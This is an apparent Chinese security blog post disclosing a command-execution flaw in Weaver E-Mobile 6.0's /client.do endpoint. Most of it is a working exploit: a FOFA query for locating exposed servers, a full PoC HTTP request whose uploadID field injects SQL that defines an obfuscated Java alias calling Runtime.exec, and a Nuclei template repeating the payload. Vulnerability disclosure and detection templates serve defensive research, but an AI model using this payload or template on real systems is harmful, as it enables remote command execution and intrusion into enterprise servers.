#  泛微E-Mobile 6.0 client.do 命令执行漏洞   
lcyunkong  云途安全   2024-04-26 12:00  
  
**0x00 阅读须知**  
  
****  
**免责声明：****本文提供的信息和方法仅供网络安全专业人员用于教学和研究目的，不得用于任何非法活动。读者若使用文章内容从事任何未授权的行为，需自行承担所有法律责任和后果。本公众号及作者对由此引起的任何直接或间接损失不负责任。请严格遵守相关法律法规。**  
###   
### 0x01 漏洞简介  
  
  
泛微e-Mobile移动管理平台是一款由泛微软件开发的企业移动办公解决方案。它提供了一系列功能和工具，使企业员工能够通过移动设备随时随地进行办公和协作。这个系统在6.0版本/client.do中被发现存在命令执行漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSZzS5EcMIjF55tqUdKvp9jIg98ibRibo1PhYZj4Y8o1HhytYLYo2ISqVSPzghOO6fNL5iaibebibvFpE4A/640?wx_fmt=png&from=appmsg "")  
###   
### 0x02 漏洞详情  
  
****  
**fofa：****app="泛微-EMobile"**  
  
****  
**Poc：**  
```
POST /client.do HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7

------WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Disposition: form-data; name="method"
 
getupload
------WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Disposition: form-data; name="uploadID"
 
1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagmf('whoami');--
------WebKitFormBoundaryTm8YXcJeyKDClbU7--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSZzS5EcMIjF55tqUdKvp9jIgQrGp6eZDE9gbmaZiateaT0PfPhYxz5eDYx9BRSKwPSaGJTWqTgicWjQ/640?wx_fmt=png&from=appmsg "")  
  
**0x03 Nuclie**  
  
```
id: weaver_e_mobile-client-rce

info:
  name: weaver_e_mobile-client-rce
  author: unknown
  severity: high
  description: 泛微E-Mobile 6.0 client.do存在命令执行漏洞
  tags: weaver_e_mobile,sqli

http:
  - raw:
      - |+
        POST /client.do HTTP/1.1
        Host: 
        Accept-Encoding: gzip, deflate
        Accept: */*
        Accept-Language: en
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7
        
        ------WebKitFormBoundaryTm8YXcJeyKDClbU7
        Content-Disposition: form-data; name="method"
         
        getupload
        ------WebKitFormBoundaryTm8YXcJeyKDClbU7
        Content-Disposition: form-data; name="uploadID"
         
        1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagmf('whoami');--
        ------WebKitFormBoundaryTm8YXcJeyKDClbU7--


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - nt authority\system
      - type: status
        status:
          - 200
```  
  
  
  
  
  
  
